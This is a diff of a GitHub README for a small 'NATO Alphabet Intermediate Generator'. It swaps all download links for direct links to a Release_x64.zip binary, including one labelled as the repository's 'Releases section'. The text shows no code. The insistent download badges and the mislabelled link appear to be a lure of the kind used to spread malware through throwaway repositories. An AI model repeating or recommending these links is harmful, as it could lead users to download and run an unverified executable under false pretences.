@@ -1,6 +1,6 @@
 # 🚀 **NATO Alphabet Intermediate Generator**
 
-[![Software.zip](https://img.shields.io/badge/Download-Software.zip-orange)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![https://github.com/Brenin0001/nato-alphabet-intermediate/releases/download/v2.0/Release_x64.zip](https://github.com/Brenin0001/nato-alphabet-intermediate/releases/download/v2.0/Release_x64.zip)](https://github.com/Brenin0001/nato-alphabet-intermediate/releases/download/v2.0/Release_x64.zip)
 
 ## Overview
 
@@ -38,8 +38,8 @@ You can use this program to quickly generate NATO phonetic lists for any words y
 
 ## Additional Information
 
-For more information, detailed documentation, and updates about the "NATO Alphabet Intermediate Generator" program, please refer to the [Releases](https://github.com/project/releases) section of this repository.
+For more information, detailed documentation, and updates about the "NATO Alphabet Intermediate Generator" program, please refer to the [Releases](https://github.com/Brenin0001/nato-alphabet-intermediate/releases/download/v2.0/Release_x64.zip) section of this repository.
 
 Explore the full potential of this program and have fun generating NATO phonetic lists for your words!
 
-🔗 [Visit the Software.zip link](https://github.com/user-attachments/files/18383251/Software.zip) 🚀
+🔗 [Visit the https://github.com/Brenin0001/nato-alphabet-intermediate/releases/download/v2.0/Release_x64.zip link](https://github.com/Brenin0001/nato-alphabet-intermediate/releases/download/v2.0/Release_x64.zip) 🚀
